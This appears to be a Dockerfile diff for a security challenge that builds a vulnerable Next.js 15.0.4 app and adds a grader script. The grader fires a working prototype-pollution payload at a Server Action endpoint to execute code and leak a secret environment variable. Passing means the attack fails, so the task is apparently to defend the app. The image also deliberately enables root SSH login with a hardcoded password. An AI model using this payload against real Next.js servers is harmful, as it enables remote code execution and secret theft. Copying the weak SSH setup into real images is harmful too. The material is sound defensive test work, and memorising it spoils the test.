@@ -1,0 +1,98 @@
+FROM ubuntu:22.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+ENV NODE_ENV=development
+
+RUN apt update && apt install -y \
+    openssh-server \
+    curl \
+    git \
+    nano \
+    sudo \
+    ca-certificates \
+    tini \
+    && rm -rf /var/lib/apt/lists/*
+
+RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
+    && apt install -y nodejs
+
+RUN mkdir /var/run/sshd
+
+RUN useradd -m -s /bin/bash dev && \
+    echo "dev:devpassword" | chpasswd && \
+    usermod -aG sudo dev
+
+RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
+    sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+WORKDIR /home/dev
+RUN chown -R dev:dev /home/dev
+
+USER dev
+
+RUN npx create-next-app@15.0.4 app \
+    --use-npm \
+    --no-tailwind \
+    --eslint
+
+WORKDIR /home/dev/app
+
+ENV RNG_SECRET=cve{nextjs-flight-protocol-issue-defended}
+
+# Create submission tool
+RUN printf '#!/usr/bin/env node\n\
+const secret = process.env.RNG_SECRET;\n\
+const payload = JSON.stringify({\n\
+  then: "$1:__proto__:then",\n\
+  status: "resolved_model",\n\
+  reason: -1,\n\
+  value: JSON.stringify({then: "$B1337"}),\n\
+  _response: {\n\
+    _prefix: `var res=process.env.RNG_SECRET;throw Object.assign(new Error(\"x\"),{digest: res});`,\n\
+    _chunks: "$Q2",\n\
+    _formData: { get: "$1:constructor:constructor" }\n\
+  }\n\
+});\n\
+\n\
+const boundary = "----WebKitFormBoundarysubmission";\n\
+const body = [\n\
+  `--${boundary}`,\n\
+  "Content-Disposition: form-data; name=\\\"0\\\"",\n\
+  "",\n\
+  payload,\n\
+  `--${boundary}`,\n\
+  "Content-Disposition: form-data; name=\\\"1\\\"",\n\
+  "",\n\
+  "\\\"$@0\\\"",\n\
+  `--${boundary}`,\n\
+  "Content-Disposition: form-data; name=\\\"2\\\"",\n\
+  "",\n\
+  "[]",\n\
+  `--${boundary}--`,\n\
+  ""\n\
+].join("\\r\\n");\n\
+\n\
+fetch("http://localhost:3000/adfa", {\n\
+  method: "POST",\n\
+  headers: {\n\
+    "Next-Action": "x",\n\
+    "Content-Type": `multipart/form-data; boundary=${boundary}`\n\
+  },\n\
+  body\n\
+}).then(res => res.text()).then(text => {\n\
+  if (text.includes(secret)) {\n\
+    console.log("\\x1b[31mIncorrect\\x1b[0m");\n\
+  } else {\n\
+    console.log("\\x1b[32mCorrect\\x1b[0m");\n\
+  }\n\
+}).catch(e => {\n\
+  console.log("\\x1b[32mCorrect\\x1b[0m");\n\
+});\n\
+' > /usr/local/bin/submit && chmod +x /usr/local/bin/submit
+
+USER root
+
+EXPOSE 22 3000
+
+ENTRYPOINT ["/usr/bin/tini", "--"]
+CMD /usr/sbin/sshd && su - dev -c "cd /home/dev/app && npm run dev -- -p 3000"
